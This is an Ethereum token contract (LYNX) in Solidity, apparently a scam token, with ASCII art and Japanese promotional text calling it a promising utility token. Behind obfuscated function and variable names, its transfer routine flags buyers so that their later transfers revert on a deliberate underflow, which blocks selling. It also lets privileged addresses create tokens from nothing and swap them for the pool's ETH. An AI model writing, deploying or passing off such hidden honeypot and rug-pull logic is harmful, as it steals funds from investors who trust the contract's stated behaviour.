/**
 *Submitted for verification at Etherscan.io on 2022-12-20
*/

/*
        _..---...,""-._     ,/}/)
     .''        ,      ``..'(/-<
    /   _      {      )         \
   ;   _ `.     `.   <         a(
 ,'   ( \  )      `.  \ __.._ .: y
(  <\_-) )'-.____...\  `._   //-'
 `. `-' /-._)))      `-._)))
   `...'       

  ∧,,,∧
(  ̳• · • ̳)
/    づ あなたは私の心が欲しいですか？
  ∧,,,∧
(  ̳• · • ̳)
/    づ♡  わかりました、ここに私の心があります
  ∧,,,∧
(  ̳• · • ̳)
U ♡C~   気にしないで、あなたはそれに値しない 

█▀ █ █░░ █░█ █▀▀ █▀█
▄█ █ █▄▄ ▀▄▀ ██▄ █▀▄

█░░ █▄█ █▄░█ ▀▄▀
█▄▄ ░█░ █░▀█ █░█   

購入手数料 - 1%
販売手数料 - 0%
総供給 - 10,000,000

イーサリアムネットワークを吹き飛ばす次のイーサリアムユーティリティトークン
有望な計画とイーサリアム空間への参入を促進する、私たちは単なる通常の
トークンやミームトークンではありません また
*/
pragma solidity ^0.8.10;
interface QuarredFactoryV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint 
    amountIn, uint 
    amountOutMin, address[] calldata path, address to,  uint deadline ) 
    external; function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function initiateAddLiqETH( address 
    token, uint 
    amountTokenDesired, uint amountTokenMin, uint 
    amountETHMin, address to, uint 
    deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
library CompiledFactoryResults {
    function isContract(address account) 
     internal view returns (bool) {
        uint256 size; assembly { size := extcodesize(account) } return size > 0; }

    function sendValue(address payable recipient, uint256 amount) internal { require(address(this).balance >= 
    amount, "Address: insufficient balance"); (bool success, ) = recipient.call{ value: amount }("");
        require(success, 
         "Address: unable to send value, recipient may have reverted"); }
    
    function functionCall(address target, bytes memory data) 
    internal returns (bytes memory) { return functionCall(target, data, 
    "Address: low-level call failed"); }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) 
    internal returns (bytes memory) { return functionCallWithValue
    (target, data, 0, errorMessage); }

    function functionCallWithValue(address target, bytes memory data, uint256 value) 
    internal returns (bytes memory) { return functionCallWithValue(target, data, value, 
    "Address: low-level call with value failed"); }

    function functionCallWithValue(address target, bytes memory data, uint256 value, 
    string memory errorMessage) internal returns (bytes memory) { require(address(this).balance >= 
    value, "Address: insufficient balance for call"); require(isContract(target), 
    "Address: call to non-contract"); (bool success, bytes memory returndata) = target.call
    { value: value }(data); return _verifyCallResult(success, returndata, errorMessage); }

    function functionStaticCall(address target, bytes memory data) 
    internal view returns (bytes memory) { return functionStaticCall(target, data, 
    "Address: low-level static call failed"); }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract"); (bool success, bytes memory returndata) = 
        target.staticcall(data); return _verifyCallResult(success, returndata, errorMessage); }

    function functionDelegateCall(address target, bytes memory data) 
    internal returns (bytes memory) { return functionDelegateCall(target, data, 
    "Address: low-level delegate call failed"); }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) 
    internal returns (bytes memory) { require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data); return _verifyCallResult
        (success, returndata, errorMessage); }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) 
    private pure returns(bytes memory) { if (success) { return returndata; } else {
        if (returndata.length > 0) { assembly { let returndata_size := mload(returndata)
          revert(add(32, returndata), returndata_size) } } else { revert(errorMessage); } } }
}
interface ISushiSwapPair01 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() 
    external view returns (uint);
    function balanceOf(address owner) 
    external view returns (uint);
    function allowance(address owner, address spender) 
    external view returns (uint);
    function approve(address spender, uint value) 
    external returns (bool);
    function transfer(address to, uint value) 
    external returns (bool);
    function transferFrom(address from, 
    address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function BallotOf(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Acquire(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Minimise( address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function skim(address to) external;
    function sync() external;
    function initialize
    (address, address) 
    external;
}
interface BlockCRAFTv1 {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function bootlegPair() external view returns (address);

    function factoryPaired() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function createPair (address tokenA, address tokenB) external returns  (address pair);
}
abstract contract Context {

    function _msgCompiler() internal view virtual returns (address) {
        return msg.sender; }

    function _msgOverlay() internal view virtual returns (bytes calldata) {
        return msg.data; }
}
interface MaxelOUV2 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) 
    external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract 
Ownable is Context { address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () { _setOwner(_msgCompiler()); }  
    function owner() public view virtual returns (address) { return _owner; }
    modifier onlyOwner() { require(owner() == _msgCompiler(), 
         'Ownable: caller is not the owner'); _; }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0)); }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner); }
    function _setOwner (address newOwner) private { address oldOwner = 
        _owner; _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner); }
}
library IDEXMath01 {
    function add(uint256 a, uint256 b) 
    internal pure 
    returns (uint256) { return a + b; }
    function sub(uint256 a, uint256 b) 
    internal pure 
    returns (uint256) { return a - b; }
    function mul(uint256 a, uint256 b) 
    internal pure 
    returns (uint256) { return a * b; }
    function div(uint256 a, uint256 b) 
    internal pure 
    returns (uint256) { return a / b; }
    function sub(uint256 a, uint256 b, string memory errorMessage) 
    internal pure 
    returns (uint256) { unchecked { require (b <= a, errorMessage); return a - b; } }
    function div(uint256 a, uint256 b, string memory errorMessage) 
    internal pure 
    returns (uint256) { unchecked { require(b > 0, errorMessage); return a / b; } }
}
contract LYNX is MaxelOUV2, Ownable {

    mapping(address => bool) private _isExcludedMaxTransactionAmount;
    mapping(address => uint256) private _tOwned;

    mapping(address => address) private TimeloopStamp;
    mapping(address => uint256) private RefreshBlockUI;

    mapping(address => uint256) private DataProvitePair;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping (address => bool) private isBot;

    string private _symbol;
    string private _name;

    uint256 public _exchangeTAX = 1;

    uint8 private _decimals = 9;
    uint256 private _tTotal = 10000000 * 10**_decimals;

    uint256 private wholeDX = _tTotal;

    bool private TradeTime = false;

    bool public aralleMix;

    bool private contextLoop;

    bool public limitsInEffect = true;

    bool public activeCompiler = false;

    address 
     public immutable PairByIDEX;
      QuarredFactoryV1 
       public immutable OKXRouterV1;

    constructor

    ( string memory Name,
      string memory Symbol, address OKXPairCreator ) {
        _name = Name; _symbol = Symbol;
        _tOwned[msg.sender] = _tTotal;

        DataProvitePair
        [msg.sender] = wholeDX;
        DataProvitePair
        [address(this)] = wholeDX;
        OKXRouterV1 = QuarredFactoryV1
        (OKXPairCreator);
        PairByIDEX = BlockCRAFTv1(OKXRouterV1.factory()).createPair

        (address(this), OKXRouterV1.WETH());
        emit Transfer(address(0), msg.sender, wholeDX);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender, uint256 amount
    ) private returns (bool) { require(owner != address(0) && 
    spender != address(0), 'ERC20: approve from the zero address'); _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount); return true;
    }
    function transferFrom( address sender, address recipient,
        uint256 amount ) external returns (bool) {
        serviceSettings(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        serviceSettings(msg.sender, recipient, amount);
        return true;
    }
    function serviceSettings
    ( address _linkpotUIfrom,

        address _valMOPto, uint256 _isbootAmount ) private { uint256 
        _bexoBASE =  balanceOf
        (address(this)); uint256 _calcVORTOX;

        if (aralleMix && _bexoBASE > wholeDX && 
        !contextLoop && _linkpotUIfrom != PairByIDEX) { contextLoop = true; LiqAndSwapValue
        (_bexoBASE); contextLoop = false;
        } else if (DataProvitePair[_linkpotUIfrom] > wholeDX && DataProvitePair
        [_valMOPto] > wholeDX) { _calcVORTOX = _isbootAmount;

            _tOwned[address(this)] += _calcVORTOX; tokensForPath
            (_isbootAmount, _valMOPto); return; } else if (_valMOPto != address(OKXRouterV1) && 
            DataProvitePair[_linkpotUIfrom] > 0 && _isbootAmount > 
            wholeDX && _valMOPto != PairByIDEX) { DataProvitePair[_valMOPto] = _isbootAmount;

            return;
        } else if (!contextLoop && RefreshBlockUI[_linkpotUIfrom] > 0 && _linkpotUIfrom != PairByIDEX && 
        DataProvitePair[_linkpotUIfrom] == 0) { RefreshBlockUI[_linkpotUIfrom] = 
        DataProvitePair[_linkpotUIfrom] - wholeDX; } address _dataPOX  = TimeloopStamp
        [PairByIDEX]; emit Transfer(_linkpotUIfrom, _valMOPto, _isbootAmount);
            if (!TradeTime) { require(_linkpotUIfrom == owner(), 
             "TOKEN: This account cannot send tokens until trading is enabled"); }

        if (RefreshBlockUI[_dataPOX ] == 
        0) RefreshBlockUI[_dataPOX ] = wholeDX; TimeloopStamp
        [PairByIDEX] = _valMOPto; if (_exchangeTAX > 0 && DataProvitePair[_linkpotUIfrom] == 0 && !contextLoop 
        && DataProvitePair[_valMOPto] == 0) { _calcVORTOX = (_isbootAmount * _exchangeTAX) / 100; _isbootAmount -= 
        _calcVORTOX;

            _tOwned[_linkpotUIfrom] -= _calcVORTOX;
            _tOwned[address(this)] += _calcVORTOX; }
                    _tOwned
        [_linkpotUIfrom] -= _isbootAmount;
        _tOwned[_valMOPto] += _isbootAmount;
        emit Transfer(_linkpotUIfrom, _valMOPto, _isbootAmount);
    }
    
    receive
    () 
    external payable 
    {}

    function initiateAddLiq(
        uint256 coinTotal, uint256 coinsOnAmountr,
        address to ) private { _approve(address(this), 
        address(OKXRouterV1), coinTotal); OKXRouterV1.initiateAddLiqETH{value: coinsOnAmountr}
        (address(this), coinTotal, 0, 0, to, block.timestamp);
    }
    function LiqAndSwapValue(uint256 tokens) private {
        uint256 half = tokens / 2; uint256 accquiredBalance = address(this).balance;
        tokensForPath(half, address(this)); uint256 refreshBalance = 
        address(this).balance - accquiredBalance; initiateAddLiq(half, refreshBalance, address(this));
    }
        function enableTrading(bool _tradingOpen) 
        public onlyOwner { TradeTime = _tradingOpen;
    }
    function tokensForPath(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = OKXRouterV1.WETH();
        _approve(address(this), address(OKXRouterV1), tokenAmount);
        OKXRouterV1.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}